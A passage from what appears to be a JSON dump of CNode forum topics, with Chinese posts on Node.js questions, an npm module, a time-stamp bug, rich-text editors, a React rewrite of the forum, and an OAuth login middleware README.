item; &#x2F;&#x2F; 当item是个函数，那么计算item(i, n, ret).此处不知道item为什么等于函数本身？？？？？只是通过实验才知道是本身\n  }\n\n  return ret;\n};\n</code></pre></div>","title":"npm模块之'filled-array以及请教源码中item的用法","last_reply_at":"2018-12-09T06:59:43.538Z","good":false,"top":false,"reply_count":0,"visit_count":470,"create_at":"2018-12-09T06:59:43.538Z","author":{"loginname":"sunfeng90","avatar_url":"https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"}},{"id":"5c0c7cd7f3d48d2397c0f4cb","author_id":"59c896f5242810b428f50405","tab":"ask","content":"<div class=\"markdown-text\"><p>如题， 请问nodejs 可以发布到iis 上吗， 另外nodjs 操作sqlserver 怎样？</p>\n</div>","title":"请问nodejs 可以host 到IIS 上吗？","last_reply_at":"2018-12-09T06:51:01.039Z","good":false,"top":false,"reply_count":2,"visit_count":515,"create_at":"2018-12-09T02:24:23.064Z","author":{"loginname":"LuckyZhangWeiwei","avatar_url":"https://avatars1.githubusercontent.com/u/25973451?v=4&s=120"}},{"id":"5c01df05be1b120abac5ea50","author_id":"5a66101f9d371d4a059eed19","tab":"share","content":"<div class=\"markdown-text\"><h4>12.08 更新</h4>\n<ul>\n<li>支持移动端浏览器</li>\n<li>支持微信授权 分享</li>\n<li>公众号已开通</li>\n<li>技术解决微信登录打开浏览器后可自己登录</li>\n<li>增加防套现程序，检测异常发推送消息</li>\n<li>优化提现速度。提现更安全 快速</li>\n<li>等等…</li>\n</ul>\n<h4>使用技术</h4>\n<ul>\n<li>微信登录授权</li>\n<li>jwt 保持登录</li>\n<li>vue 前端页面</li>\n<li>nodejs mongodb koa …</li>\n<li>WebSocket … 登录 支付通知</li>\n<li>tg 机器人消息</li>\n<li>…</li>\n</ul>\n<h4>手机微信地址</h4>\n<p><img src=\"https://cngrok-1257729714.cos.ap-chengdu.myqcloud.com/client/1544263863.png\" alt></p>\n<h4>PC站地址   <a href=\"https://www.cngrok.com\">https://www.cngrok.com</a></h4>\n</div>","title":"使用nodejs 撸的红包收割机～快来领红包。动动小手 十元到手 。。。","last_reply_at":"2018-12-08T15:16:09.902Z","good":false,"top":false,"reply_count":5,"visit_count":1792,"create_at":"2018-12-01T01:08:21.685Z","author":{"loginname":"wlijie","avatar_url":"https://avatars2.githubusercontent.com/u/14119649?v=4&s=120"}},{"id":"5c0b4aab15a4d545e3f4c697","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p>2018 年，考拉开始对现有项目的常用的工具库进行整理，包含日期处理，数字处理，logger 等常用工具，并打包成 npm module，方便各个项目使用。<br>\n后期，我们也将重点分享这部分工具库的使用，大家感兴趣的一起来交流学习，有bug欢迎提出！</p>\n<h2>一、代码风格</h2>\n<p>在开发工具库之前，我们统一了编码标准</p>\n<h3>（一）JavaScript 代码规范</h3>\n<p>前端 browser 通用\n统一使用 <a href=\"https://github.com/kaolalicai/eslint-config-klg\">eslint-config-klg</a> ，基于 <a href=\"https://github.com/standard/eslint-config-standard\">eslint-config-standard</a> 封装\n安装说明见文档</p>\n<h3>（二）Typescript 代码规范</h3>\n<p>统一使用 <a href=\"https://github.com/kaolalicai/tslint-config-klg\">tslint-config-klg</a> ，基于 <a href=\"https://github.com/standard/tslint-config-standard\">tslint-config-standard</a> 封装</p>\n<p>安装说明见文档</p>\n<h2>二、脚手架</h2>\n<p>我们也提供了脚手架 <a href=\"https://github.com/kaolalicai/egg-init\">klg-init</a>，来方便大家启动一个新项目。\n安装好这个工具后，一键生成项目模板</p>\n<pre class=\"prettyprint language- bash\"><code>$ klg-init dest\n[klg-init] fetching npm info of klg-init-config\n? Please select a boilerplate type (Use arrow keys)  \n  ──────────────  \n❯ module - npm 库项目模板  \n  model - mongoose model 模板 todo  \n  project - JavaScript 后端项目模板 todo  \n  project-ts - Typescript 后端项目模板 todo  \n  admin - 管理后台项目模板 todo  \n</code></pre><p>目前支持的模板有：</p>\n<ul>\n<li>npm module，模板地址：<a href=\"https://github.com/kaolalicai/klg-boilerplate-module\">https://github.com/kaolalicai/klg-boilerplate-module</a></li>\n<li>typescript + koa + mongoose 后端项目，模板地址：<a href=\"https://github.com/kaolalicai/klg-koa-starter-kit\">https://github.com/kaolalicai/klg-koa-starter-kit</a></li>\n<li>管理后台项目，模板地址：<a href=\"https://github.com/kaolalicai/klg-admin-boilerplate\">https://github.com/kaolalicai/klg-admin-boilerplate</a></li>\n</ul>\n<h2>三、工具库列表</h2>\n<p>目前已经发布的工具库有：</p>\n<ul>\n<li>klg-logger ： logger 工具，基于 tracer</li>\n<li>klg-number ： 数字处理，主要解决 node 小数精度问题</li>\n<li>klg-request-log ：http 请求 log 记录，方便排查问题</li>\n<li>klg-mq ： rabbitmq 连接工具</li>\n<li>klg-mq-koa ： 将 mq 和 koa router 无缝结合</li>\n<li>klg-redlock ： 基于 redis 的分布式锁</li>\n<li>klg-date ： 日期处理，基于 moment</li>\n<li>klg-request ： 后端使用的 http 请求工具，基于 superagent</li>\n<li>klg-retry ： 重试工具</li>\n<li>klg-tracer ： 链路追踪工具，该项目实际不能使用，原因见项目内文档</li>\n</ul>\n<p>上述项目都可以在我们公司的开源账号找到 <a href=\"https://github.com/kaolalicai?utf8=%E2%9C%93&amp;q=&amp;type=&amp;language=typescript\">AI考拉GitHub账号</a></p>\n<h2>结语</h2>\n<p>（工具库还未整理前）\n考拉dev（咆哮状）：嗯？谁搞的这个bug？给我站出来！\n哦。。。好像是我之前搞出来的。。。\n（工具库使用期）\n考拉dev：你以为有了工具库bug就没有了吗？<br>\n不存在的，不过搬砖的时候更方便了，偶尔还可以打打养生代码~</p>\n<hr>\n<p>工具库将不定时更新，欢迎在下面留下你的反馈，我们也会不断更新！<br>\n著作权归本文作者所有，未经授权，请勿转载，谢谢。</p>\n</div>","title":"AI考拉技术分享-Node基础架构专题","last_reply_at":"2018-12-08T15:07:55.762Z","good":false,"top":false,"reply_count":1,"visit_count":627,"create_at":"2018-12-08T04:38:03.608Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c0b9fca7ec239239ff54de9","author_id":"5c0b9addf3d48d2397c0f3d1","tab":"share","content":"<div class=\"markdown-text\"><p>再也不用到处找资源了，看豆瓣评分，看电影，一气呵成😜</p>\n<p>详情请点击 <a href=\"https://github.com/Neulana/douban-movie-extension\">Github仓库链接</a></p>\n<p>喜欢的话就赏我个star⭐️吧～</p>\n<p>来自酷炫的 <a href=\"https://github.com/TakWolf/CNode-Material-Design\">CNodeMD</a></p>\n</div>","title":"弄了一个豆瓣电影的chrome插件","last_reply_at":"2018-12-08T10:41:14.438Z","good":false,"top":false,"reply_count":0,"visit_count":504,"create_at":"2018-12-08T10:41:14.438Z","author":{"loginname":"Neulana","avatar_url":"https://avatars2.githubusercontent.com/u/27862542?v=4&s=120"}},{"id":"5c0b57a715a4d545e3f4c6c3","author_id":"57aaad434653749872ec6f6b","tab":"ask","content":"<div class=\"markdown-text\"><p>我有一个文章表 一个标签表 还有一个文章标签中间表，我知道sequelize可以建立多对多关系，但是我想手动建立这张中间表，可是创建完model之后，sequelize的方法都不能用。但是其他的表操作起来没有任何问题</p>\n<h3>model</h3>\n<p><img src=\"//static.cnodejs.org/FhpcXFedQ02LCWFzt1aQvNN1nive\" alt=\"image.png\"></p>\n<h3>controller</h3>\n<p><img src=\"//static.cnodejs.org/Fqli2j9eeufOzsRTeDTGe0j1KCvL\" alt=\"image.png\"></p>\n<h3>接口调用</h3>\n<p><img src=\"//static.cnodejs.org/FoyOhw_wcG9sjKgfEnr-kgDHrA-q\" alt=\"image.png\">\n请问有人知道这个原因么</p>\n</div>","title":"egg-sequelize 手动建立中间表无法使用问题","last_reply_at":"2018-12-08T06:45:10.689Z","good":false,"top":false,"reply_count":1,"visit_count":681,"create_at":"2018-12-08T05:33:27.162Z","author":{"loginname":"xumjs8623","avatar_url":"https://avatars0.githubusercontent.com/u/12467615?v=4&s=120"}},{"id":"5c090bd515a4d545e3f4bed4","author_id":"5c09091f15a4d545e3f4becc","tab":"ask","content":"<div class=\"markdown-text\"><p>最近在研究网易出的pomelo。平台是win10.版本是8.11.3\n启动框架，什么也不做，随机过几分钟会打印某个服务器心跳超时，然后会断开其中一台服务器。</p>\n<p>仔细跟了下，发现log如下:\n[2018-12-06 19:11:38.796] [INFO] console - timer master-server-1 update lastPing time: 1544094698796\n[2018-12-06 19:11:38.793] [INFO] console - timer master-server-1 update lastPong time: 1544094698793</p>\n<p>其中lastPing是发送心跳，lastPong是接受心跳。问题就出在最后的时间戳上。\n可见第一个发送心跳的时间戳反而比接受更晚。最前面的时间是console.log()自己写的也会有这个问题。但是log的写入顺序是正常的,因此不像是异步的问题。\n感觉win下node在通过Date.now()获取当前时间时有bug,因此导致后面比较时间戳时出现了问题关掉socket。\n我用new Date().valueOf()或者其他方法。都会有这个问题，并且最新的10.x.x也有。</p>\n<p><strong>最最最重要的是，这个问题在linux上不会出现，无论挂多久都不会。。。</strong></p>\n<p>说实话不敢相信获取系统时间这么常用的功能，node怎么会都有问题。\n请大神看看。</p>\n</div>","title":"发现nodejs一个获取时间的bug","last_reply_at":"2018-12-08T05:33:45.467Z","good":false,"top":false,"reply_count":4,"visit_count":1034,"create_at":"2018-12-06T11:45:25.510Z","author":{"loginname":"chxy85","avatar_url":"https://avatars0.githubusercontent.com/u/5097232?v=4&s=120"}},{"id":"5bebbc2dbe1b120abac592a2","author_id":"58d83c586f8b9bf02d1d0b1d","tab":"ask","content":"<div class=\"markdown-text\"><p>TCP抓包是否可行</p>\n</div>","title":"微信朋友圈能爬吗","last_reply_at":"2018-12-08T03:38:42.001Z","good":false,"top":false,"reply_count":16,"visit_count":1908,"create_at":"2018-11-14T06:09:49.861Z","author":{"loginname":"ResJay","avatar_url":"https://avatars0.githubusercontent.com/u/26635410?v=4&s=120"}},{"id":"560cf75b1f6dc88c04049ae5","author_id":"545870576537f4d52c414eb6","tab":"share","content":"<div class=\"markdown-text\"><p>有Github账户的，大家互粉下吧，\n大家可以跟帖，发上自己的 Github账户，我们互粉下，以后方便分享，自己的账户也有面子哈。\n我的：<a href=\"https://github.com/pangguoming\">https://github.com/pangguoming</a></p>\n</div>","title":"有Github账户的，大家互粉下吧， 我的：https://github.com/pangguoming","last_reply_at":"2018-12-08T03:30:26.569Z","good":false,"top":false,"reply_count":45,"visit_count":7865,"create_at":"2015-10-01T09:05:31.136Z","author":{"loginname":"pangguoming","avatar_url":"https://avatars1.githubusercontent.com/u/7269202?v=4&s=120"}},{"id":"5c0a43a715a4d545e3f4c493","author_id":"50b6e92a637ffa41551f2986","tab":"ask","content":"<div class=\"markdown-text\"><p>漏洞影响：所有操作系统上使用chromium内核的产品</p>\n<p>node.js使用的是chrome V8的内核。请问这样受影响么</p>\n</div>","title":"chrome 被曝发现了大量的SQLite 的漏洞，请问nodejs受影响不","last_reply_at":"2018-12-08T02:27:17.254Z","good":false,"top":false,"reply_count":1,"visit_count":811,"create_at":"2018-12-07T09:55:51.258Z","author":{"loginname":"beiyio","avatar_url":"//gravatar.com/avatar/0808e2b8693f46047e56d738e12e22ee?size=48"}},{"id":"5c0a0e2bd3b8ab334e8dbc72","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>比如有个集合task，task下有三列 A , B, C。做聚合的时候想实现  <code>sum( A + (B * C)) as rs</code> 这样的效果。</p>\n</div>","title":"mongo做聚合的时候，多列加减乘除怎么写？","last_reply_at":"2018-12-07T07:23:15.938Z","good":false,"top":false,"reply_count":2,"visit_count":615,"create_at":"2018-12-07T06:07:39.886Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5c07461e1c62d83349350ec0","author_id":"55f183a188f76a8469b43519","tab":"ask","content":"<div class=\"markdown-text\"><p>在做leetcode的题目.\n练习2sum的时候, 我的代码如下</p>\n<pre class=\"prettyprint\"><code>var twoSum = function(nums, target) {\n    const set = {};\n    for (var i = 0; i &lt; nums.length; i++) {\n        const val = nums[i];\n        const find = set[val];\n        if (find !== undefined) {\n            return [find, i,];\n        } else {\n            &#x2F;&#x2F; 如果将来某个值满足target - nums[i], 则可以和这个位置匹配\n            set[target - val] = i;\n        }\n    }\n};\n</code></pre><p>80 ms, 排在60%</p>\n<p>然后看了排在80%的代码, 就比我少了一个else, 我自己测试一下代码</p>\n<pre class=\"prettyprint\"><code>var twoSum = function(nums, target) {\n    const set = {};\n    \n    for (var i = 0; i &lt; nums.length; i++) {\n        const val = nums[i];\n        const find = set[val];\n        if (find !== undefined) {\n            return [find, i,];\n        } \n\t\t&#x2F;&#x2F; 就这里去除了else\n\t\t&#x2F;&#x2F; 如果将来某个值满足target - nums[i], 则可以和这个位置匹配\n\t\tset[target - val] = i;\n    }\n};\n</code></pre><p>56 ms, 排88%</p>\n<p>一个else语句能有这么大影响? 什么原理?</p>\n</div>","title":"else语句会拖慢运行时间?","last_reply_at":"2018-12-07T04:21:41.225Z","good":false,"top":false,"reply_count":11,"visit_count":1112,"create_at":"2018-12-05T03:29:34.595Z","author":{"loginname":"fulvaz","avatar_url":"https://avatars1.githubusercontent.com/u/6868351?v=4&s=120"}},{"id":"5c0505ad1c62d83349350328","author_id":"5c0362f439c0af64fddb7c92","tab":"share","content":"<div class=\"markdown-text\"><p>做过前端的朋友，大家或多或少都接到过做用户交互的需求。这时候只要一听到产品经理说能不能支持加粗，斜体和@好友，大家肯定就会在心里默念“S**t，又要跳富文本编辑器的坑了”。</p>\n<p>曾经知乎上面有过一个问题，<a href=\"https://www.zhihu.com/question/26739121\">有多大比例的前端工程师，能在合理的时间内独立开发出一个足以供商业网站使用的文本编辑器？</a>大家一致认为在千分之一，甚至万分之一左右。这样我们要先了解富文本编辑器的各种特性（坑），才能往成为千分之一的道路前进。</p>\n<p>富文本编辑器的坑在我总结起来有两大类：</p>\n<p>一是视图层的绘制，Facebook早期是使用<code>&lt;div&gt;</code>在<code>&lt;textarea&gt;</code>上面实现效果，并且需要大量使用了DOM测量。早期Facebook工程师发愁的事情之一就是提及的蓝色背景与文字偏离。</p>\n<p><img src=\"//static.cnodejs.org/FrRJXkalYh6dw-pkWRMqEoR0wQRY\" alt=\"1676eeeb51ad6853.jpeg\"></p>\n<p>二是各种编辑时候的各种小（天）坑。比如光标位置，输入法，兼容性。。。</p>\n<p>面对上面的各种坑，一个传统的解决办法是使用DOM的特性，contentEditable。不过说到这很多同学要开始翻白眼了，虽然有很多不错的实现（tinyMec，Quill），但是contentEditable还是有名的难易控制，并且在不同版本实现不同。</p>\n<p>不过在React出现之后，事情有了转机。作为一个视图层库，React能够很好的抽象原生DOM的操作，让开发者可以使用组件来定义不同的富文本格式。可以说一次性的降低了富文本编辑器的开发难度。</p>\n<p>在React.js Conf 2016上面，Facebook开源了Draft.js，作为Facebook一众文本编辑需求的产品上面的新选择（状态发布，评论，Facebook Note，Messenger）。</p>\n<p><img src=\"//static.cnodejs.org/FsFdCS88JLLDYAYzngS3cWzaO6rN\" alt=\"1676de93392d28be.jpeg\"></p>\n<p>Draft.js除了与React紧密的整合之外，另外一个很大的优势就是利用contentEditable这个DOM特性解决一众编辑器小坑的同时，使用immutable的数据结构来代表编辑器的状态，很好的分离了DOM和state。所以除了Facebook，很多公司也上手了Draft.js，比如知乎。</p>\n<p>Draft.js给富文本编辑器提供了一个很简单明了的解决办法，就是React -&gt; view，immutable.js -&gt; model，然后Draft.js提供编辑器操作作为controller。让我们来看下面一个例子：</p>\n<pre class=\"prettyprint language-javascript\"><code>import React from &#x27;react&#x27;;\nimport ReactDOM from &#x27;react-dom&#x27;;\nimport {Editor, EditorState} from &#x27;draft-js&#x27;;\n\nclass MyEditor extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {editorState: EditorState.createEmpty()};\n    this.onChange = (editorState) =&gt; this.setState({editorState});\n  }\n  render() {\n    return (\n        &lt;Editor editorState={this.state.editorState} onChange={this.onChange} &#x2F;&gt;\n    );\n  }\n}\n\nReactDOM.render(\n  &lt;MyEditor &#x2F;&gt;,\n  document.getElementById(&#x27;container&#x27;)\n); \n</code></pre><p>editorState可以理解为编辑器在某一刻的一个快照（snapshot）。同时editorState也是一个由不可变（immutable）数据类型构成的对象。依据editorState，我们可以实现对编辑器内容的严格控制，并且知道如何render编辑器界面。</p>\n<p>而富文本功能的实现，既可以通过已有的html element（h1，h2，ul，ol）也可以通过自定义的CSS。</p>\n<pre class=\"prettyprint language-js\"><code>.superFancyBlockquote {\n  color: #999;\n  font-family: &#x27;Hoefler Text&#x27;, Georgia, serif;\n  font-style: italic;\n  text-align: center;\n}\n</code></pre><p>编辑器的操作则是非常的函数式化，之前我提到过，每个editorState可以看做编辑器的一个快照。这样每个操作（加粗，删除等）输入参数为editorState，返回结果也是一个editorState，再由DOM去render。这样状态机的设计，既函数式化，又可以保证将编辑器操作流水线化。比如切换code模块的接口就是：</p>\n<pre class=\"prettyprint language-js\"><code>toggleCode: (editorState: EditorState) =&gt; EditorState\n</code></pre><p>除了Draft.js，现在开源社区还有一个类似的很火的开源富文本编辑库 - Slate。</p>\n<p><img src=\"//static.cnodejs.org/Ftmx_xMGWeWdEIK0A1SDIVTk-pDa\" alt=\"1676f12faff96520.jpeg\"></p>\n<p>Slate除了沿用很多Draft.js的先进的想法之外，更是在插件化，简化API接口方面做出了自己的特色。现在Gitbook和语雀都使用了Slate作为底层编辑器，而且前几天在Hacker News上面出现以后更是star数目一跃到了12000+（迫近Draft.js）。Slate官方介绍自己的优势有：</p>\n<ul>\n<li>插件是一等公民</li>\n<li>文档格式不设限</li>\n<li>层级文档模型</li>\n<li>与DOM平行</li>\n<li>无状态的视图层与不可变的数据层</li>\n<li>直观的操作</li>\n<li>可协调的数据模型</li>\n<li>明确的核心逻辑</li>\n</ul>\n<p>之前在旧金山跟Slate创始人Ian面基的时候，他也分享过自己开发富文本编辑器遇到过得各种坑和各种思考，并且希望把Slate做成一个完全插件化的编辑器框架。（p.s.，不过作为个人开发者，Ian小哥的任性，比如对IME和协同的支持的抉择过程，也非常有意思）。</p>\n<p>Slate的代码模块化程度非常高，设计也力求插件化优先。小哥作为Rhode Island School of Design毕业，设计师转的程序员，对接口设计的追求可见一斑（没事改API接口名称的习惯就不吐槽了）。</p>\n<p>如果大家感兴趣，我也计划陆续推出几篇解读这个框架源码的文章。</p>\n<p>------各单位注意，马上要开始打广告了:p------</p>\n<p>在研究了这么多富文本编辑器，WYSIWYG编辑器之后，我和我的好基友也开发了一款面向hacker的笔记应用 - Tea：</p>\n<p><img src=\"//static.cnodejs.org/FurOsDDHfshFHZO1A3fxDlnJ7WZf\" alt=\"overview.png\"></p>\n<p>现在已经开始内测啦！主打的特色有：</p>\n<ul>\n<li>插件是一等公民，比如，这个插件：</li>\n</ul>\n<p><img src=\"https://tea-note.oss-cn-hangzhou.aliyuncs.com/v2ex/power-mode.gif\" alt=\"overview.png\"></p>\n<ul>\n<li>极简的界面，</li>\n<li>实时渲染的 Markdown，</li>\n<li>各种与编辑器相通的快捷键，</li>\n<li>代码高亮等功能</li>\n</ul>\n<p>对我们感兴趣的同学可以去看我们在掘金上的专栏：<a href=\"https://juejin.im/post/5bffadf3f265da616a476096\">https://juejin.im/post/5bffadf3f265da616a476096</a>，里面有我们项目更详细的介绍和内测版下载链接。</p>\n</div>","title":"了解富文本编辑器？恭喜你，你已经超越了99%的前端程序员","last_reply_at":"2018-12-07T02:44:55.572Z","good":false,"top":false,"reply_count":7,"visit_count":1440,"create_at":"2018-12-03T10:30:05.186Z","author":{"loginname":"giddens9527","avatar_url":"https://avatars2.githubusercontent.com/u/2219296?v=4&s=120"}},{"id":"5c069b951c62d83349350c5d","author_id":"5c0536f21c62d83349350420","tab":"ask","content":"<div class=\"markdown-text\"><p>目前公司web项目基于koa2,项目业务逻辑复杂之后,感觉层级,结构很混乱,各位大佬能否分享一下自己觉着好的项目案例或者链接,学习一下.\n目前存在以下问题:\n1.接口业务复杂,跨系统,目前通过grpc通信,如何保障数据一致性,错误回滚;\n2.项目结构划分不清楚,对于服务层,控制层,没有清晰界限,;\n3.目前没有单元测试,是否必要,不清楚怎么把一个复杂接口划分一个模块单元,求示例代码;\n4.对于node很多模块还没用到,多进程.\n如果问题太小白,请忽略哈,如果有架构方面入门书籍推荐更好了.</p>\n</div>","title":"求一些成熟项目架构源码分享","last_reply_at":"2018-12-06T14:16:14.790Z","good":false,"top":false,"reply_count":8,"visit_count":1009,"create_at":"2018-12-04T15:21:57.707Z","author":{"loginname":"yanqi321","avatar_url":"https://avatars1.githubusercontent.com/u/22360047?v=4&s=120"}},{"id":"5c066e5cd3b8ab334e8daade","author_id":"58f837a3bbaf2f3f569be082","tab":"share","content":"<div class=\"markdown-text\"><p><strong><a href=\"https://github.com/shuiRong/ReactCnodeJS\">Github</a></strong>   <strong><a href=\"https://reactcnodejs.netlify.com/\">DEMO</a></strong></p>\n<blockquote>\n<p>一个 React 的<strong>初/中级</strong>练习项目：重构 CnodeJS 社区</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/Fr95zWpE2LUpmWm4HK69oxXnAxj0\" alt=\"preview.png\"></p>\n<hr>\n<p>这里<strong>简述下我学习 React 的方式：</strong></p>\n<ol>\n<li>看了一边文档，把‘主要概念’全部看完，‘高级指引’里的根据个人兴趣挑了一些看了看。</li>\n<li>紧接着就动手写此项目（大概花了 3 天的业余时间完成）</li>\n</ol>\n<p>在此期间根据需要，看了 React-Router 文档，了解了 Redux 的实现原理（但本项目并没有用 Redux）（歪个楼：“我相信任何复杂技术背后的原理都是简单易懂的”）</p>\n<p><strong>P.S.</strong> 如果你想入门 React,但苦于没有难度合适的项目的话，<strong>It’s For You!</strong>\n（考虑到别人可能会看我源码来学习，我补充了 <strong>“非常详细的注释”</strong> ）</p>\n<hr>\n<p><strong>P.P.S.</strong> 朋友看到后吐槽了句“怎么不是cnode，就是v2ex”（我补充了下“爬虫的话就是煎蛋？ ”）XD</p>\n</div>","title":"看完React文档后，重写了下CnodeJS社区，感觉看上去还不错","last_reply_at":"2018-12-06T09:33:50.141Z","good":false,"top":false,"reply_count":9,"visit_count":1355,"create_at":"2018-12-04T12:09:00.191Z","author":{"loginname":"shuiRong","avatar_url":"https://avatars1.githubusercontent.com/u/16076993?v=4&s=120"}},{"id":"5bee4ae7a05b0e0ae443bc90","author_id":"56daaf5dc0fa23473d005feb","tab":"share","content":"<div class=\"markdown-text\"><h1><a href=\"https://github.com/zhulinwei/l-passport\">l-passport</a></h1>\n<p>集成微信(wechat)、QQ(qq)、百度(baidu)和微博(weibo)于一体的koa中间件与API SDK</p>\n<h2>功能列表</h2>\n<ul>\n<li>OAuth授权</li>\n<li>获取用户基本信息</li>\n</ul>\n<p>koa2中间件，开发者可以通过此中间件获取用户的基本信息（包括用户编号、昵称、头像）</p>\n<h2>Installation</h2>\n<pre class=\"prettyprint language-sh\"><code>npm install l-passport -S\n</code></pre><h2>Usage</h2>\n<h3>Authentication</h3>\n<p>引入l-passport并配置</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\n&#x2F;&#x2F; 微信登录：设置appId与app secret\npassport.initialize({\n  provider: &#x27;wechat&#x27;\n  appId: &#x27;your_app_id&#x27;,\n  appSecret: &#x27;your_app_secret&#x27;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat&#x27;, passport.authorization(&#x27;wechat&#x27;), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n</code></pre><p>如果需要配置多个平台（如web、ios、android），建议参考如下代码</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\npassport.initialize({\n  provider: &#x27;wechat&#x27;, \n  clients: [\n    { platform: &#x27;web&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n    { platform: &#x27;ios&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n    { platform: &#x27;android&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n  ]\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_web&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;web&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_ios&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;ios&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_android&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;android&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n</code></pre><p>如果需要配置多个服务提供商与多个平台，建议参考如下代码</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\npassport.initialize([\n  {\n    provider: &#x27;wechat&#x27;, \n    clients: [\n      { platform: &#x27;web&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n      { platform: &#x27;ios&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n      { platform: &#x27;android&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27; },\n    ]\n  },\n  {\n    provider: &#x27;baidu&#x27;, \n    clients: [\n      { platform: &#x27;web&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27;, redirect: &#x27;your_baidu_redirect&#x27; },\n      { platform: &#x27;ios&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27;, redirect: &#x27;your_baidu_redirect&#x27;},\n      { platform: &#x27;android&#x27;, appId: &#x27;your_app_id&#x27;, appSecret: &#x27;your_app_secret&#x27;, redirect: &#x27;your_baidu_redirect&#x27; },\n    ]\n  }\n]);\n\nrouter.get(&#x27;&#x2F;login&#x2F;wechat_web&#x27;, passport.authorization(&#x27;wechat&#x27;, { platform: &#x27;web&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;baidu_ios&#x27;, passport.authorization(&#x27;baidu&#x27;, { platform: &#x27;ios&#x27; }), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n</code></pre><h4>配置参数说明：</h4>\n<ul>\n<li><code>provider</code>: - 服务提供商（必选）\n<ul>\n<li>当前可选：qq、baidu、weibo、wechat</li>\n</ul>\n</li>\n<li><code>appId</code>: - 应用编号（必填）</li>\n<li><code>appSecret</code>: - 应用秘钥（必填）</li>\n<li><code>redirect</code>: - 应用回调地址（选填）\n<ul>\n<li>用于生成授权地址或完成授权认证</li>\n</ul>\n</li>\n<li><code>platform</code>: - 服务平台（选填）</li>\n<li><code>scope</code>: - scope值（选填）</li>\n<li><code>state</code>: - state值（选填）</li>\n</ul>\n<h3>Authentication Url</h3>\n<p>注意：不同的服务提供商之间，在认证时对回调地址的处理方式各不相同，如微信不会检查回调函数，微博和QQ只需核查回调函数的域名，而百度则需要核查包括Query参数在内的整个回调地址</p>\n<p>l-passport支持两种方式设置对调函数</p>\n<p>1.配置设置</p>\n<pre class=\"prettyprint language-js\"><code>const passport = require(&#x27;l-passport&#x27;);\n\npassport.initialize({\n  provider: &#x27;baidu&#x27;\n  appId: &#x27;your_app_id&#x27;,\n  appSecret: &#x27;your_app_secret&#x27;,\n  redirect: &#x27;your_app_redirect&#x27;,\n  state: &#x27;your_app_state&#x27;,\n  scope: &#x27;your_app_scope&#x27;\n});\n\nrouter.get(&#x27;&#x2F;login&#x2F;baidu&#x27;, passport.authorization(&#x27;baidu&#x27;), async (ctx) =&gt; {\n  ctx.body = ctx.state.passport;\n});\n\n</code></pre><p>2.动态设置</p>\n<p>将redirect、state、scope放在路由的Query参数中，如/login/baidu?redirect=your_redirect&amp;state=your_state&amp;scope=your_scope</p>\n<h3>拓展登录策略</h3>\n<p>l-passport已经集成如下：</p>\n<blockquote>\n<ul>\n<li>1.qq：QQ登录</li>\n<li>2.baidu：百度登录</li>\n<li>3.weibo：微博登录</li>\n<li>4.wechat：微信登录</li>\n</ul>\n</blockquote>\n<p>如果开发者觉得当前集成的登录策略无法满足需求时，可以自行拓展，其基本形式如下：</p>\n<pre class=\"prettyprint language-js\"><code>class YourStragety {\n  &#x2F;&#x2F; 服务提供商提供的授权地址  \n  getAuthorizeUrl(redirect, state, scope) {}\n\n  &#x2F;&#x2F; 用户通过授权后的认证过程\n  authorize(code) {}\n}\n\npassport.use(&#x27;your_stagety_name&#x27;, YourStragety);\n</code></pre><h3>用户信息格式</h3>\n<p>认证完成后用户信息将挂载ctx.state.passport中，其基本格式如下：</p>\n<pre class=\"prettyprint language-json\"><code>{\n  &quot;provider&quot;: &quot;服务提供商&quot;,\n  &quot;uid&quot;     : &quot;用户编号&quot;,\n  &quot;nickname&quot;: &quot;用户昵称&quot;,\n  &quot;avatar&quot;  : &quot;用户头像&quot;,\n  &quot;body&quot;    : {}\n}\n</code></pre><p>keyword：QQ OAuth2、Wechat OAuth2、Baidu OAuth2、Weibo 